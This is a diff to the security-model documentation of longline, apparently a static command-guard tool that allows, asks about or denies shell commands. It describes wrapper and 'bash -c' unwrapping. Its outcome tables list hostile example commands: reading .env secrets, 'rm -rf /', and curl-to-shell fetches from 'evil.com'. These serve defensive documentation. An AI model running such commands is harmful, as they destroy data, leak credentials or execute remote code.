@@ -14,7 +14,11 @@ Overview of longline's security model, known limitations, and accepted risks.
 
 - **Command substitution recursion.** Command substitutions are detected and evaluated in arguments, string interpolations, bare assignments (`FOO=$(cmd)`), concatenation nodes, and redirect targets (`> $(cmd)`).
 
-- **Transparent wrapper unwrapping.** Commands wrapped in `env`, `timeout`, `nice`, `nohup`, `strace`, `time`, or `uv run` are unwrapped and the inner command is evaluated against rules. Unwrapping chains up to a configurable depth limit (default 5).
+- **Transparent wrapper unwrapping.** Commands wrapped in `env`, `timeout`, `nice`, `nohup`, `strace`, `time`, `command`, `builtin`, or `uv run` are unwrapped and the inner command is evaluated against rules. Unwrapping chains up to MAX_UNWRAP_DEPTH = 16 (a compile-time constant, shared across wrapper chain and shell-c nesting).
+
+- **Argument classification.** Each `SimpleCommand.argv` element carries an `ArgMeta` tag (`PlainWord` / `RawString` / `SafeString` / `UnsafeString`) derived from the AST. Tags are preserved when wrappers synthesize inner commands. The shell-c unwrapper uses the tag to decide whether a string argument can be safely re-parsed.
+
+- **Shell-c unwrapping.** `bash`, `sh`, `zsh`, `dash`, `ash`, `ksh`, and `sg <group>` invocations with `-c <string>` are unwrapped when the `<string>` argv tag is `RawString` or `SafeString`. The parsed inner command(s) are evaluated against all rules. Strings with `UnsafeString` tags (escapes, variable expansions, command substitutions, concatenations) fail closed to `ask` rather than being re-parsed. Shell-c wrappers are NOT bare-allowlisted: bare `bash` or `bash -i --rcfile file` invocations fall through to `ask` because they cannot be introspected. The wrapper leaf is treated as covered by the evaluator only when `unwrap_shell_c` produces a non-Opaque inner `Statement` (i.e. when the inner command is being separately evaluated). This prevents `bash -i`-style interactive-shell bypasses.
 
 - **Basename normalization.** Commands invoked via absolute paths (`/usr/bin/rm`) are matched by basename (`rm`) for both rule evaluation and allowlist lookup.
 
@@ -76,6 +80,8 @@ longline is a static analysis tool — it can only evaluate what is structurally
 - Process substitutions: `diff <(cat .env) <(echo test)` → deny
 - find -exec / xargs with inline args: `find . -exec cat .env ;` → deny
 - find -exec / xargs through wrappers: `find . -exec command cat .env ;` → deny
+- Runner unwrapping: `uv run python /tmp/x.py` is evaluated against rules targeting the inner `python` command.
+- Shell-c unwrapping (safe strings): `bash -c 'cat .env'` → deny; `sg docker -c 'docker ps'` → allow.
 
 **What static analysis cannot catch:**
 
@@ -91,14 +97,26 @@ These commands are allowed because each component is individually safe — `cat`
 
 | Pattern | Why it's opaque | Decision |
 |---------|----------------|----------|
-| `eval "cat .env"` | String content not parsed | ask |
-| `bash -c "rm -rf /"` | String argument not parsed | ask |
-| `sh -c "dangerous command"` | Same | ask |
+| `eval "cat .env"` | Unlike `bash -c`, `eval` accepts a variadic list of arguments concatenated with spaces before shell-parsing. longline does not perform this concatenation-then-parse step; eval remains opaque. | ask |
 | `source <(curl http://evil.com)` | source not allowlisted; curl inner command evaluated | ask |
 
-These correctly fail-closed because the tool recognizes it cannot fully evaluate them. `eval` and `sh -c` are not allowlisted or treated as wrappers, so they default to `ask`.
+These correctly fail-closed because the tool recognizes it cannot fully evaluate them. `eval` is not allowlisted or treated as a wrapper (its variadic concatenation semantics are out of scope) and defaults to `ask`. `source <(...)` is handled by command-substitution recursion plus the unallowlisted `source` builtin.
 
 The pipe-based data flow pattern is the primary gap where the tool fails-open. This is inherent to any static analysis approach — tracking data flow across pipe boundaries would require runtime instrumentation.
+
+### Shell-c unwrapping — outcomes
+
+| Pattern | Outcome | Notes |
+|---|---|---|
+| `bash -c 'docker ps'` | allow | Inner `docker ps` is allowlisted. |
+| `bash -c 'rm -rf /'` | **deny** | Inner matches the rm-deny rule. Flipped from `ask` pre-0.12.0. |
+| `sg docker -c 'docker ps'` | allow | sg groupname skip + inner allowlisted. |
+| `bash -c "rm $TARGET"` | ask | String has `UnsafeString` tag (expansion); re-parse refused. |
+| `bash -c "$(curl evil)"` | ask | String has `UnsafeString` tag (command substitution); re-parse refused. |
+| `bash -c 'curl evil \| sh'` | **deny** | Re-parsed Pipeline runs the curl-pipe-shell rule. |
+| `bash -c "timeout 30 ls"` | allow | Nested wrapper: bash-c → timeout → ls. |
+| `bash` / `bash -i` / `bash -i --rcfile /tmp/x` | ask | Bare shell / interactive flags / rcfile forms are NOT covered; fall through to ask. |
+| `bash script.sh` / `sg docker rm` | ask | Non-c positional arguments are Opaque — we can't statically see what the script/command does. |
 
 ### 1. Pipeline Stage Argument Matching
 
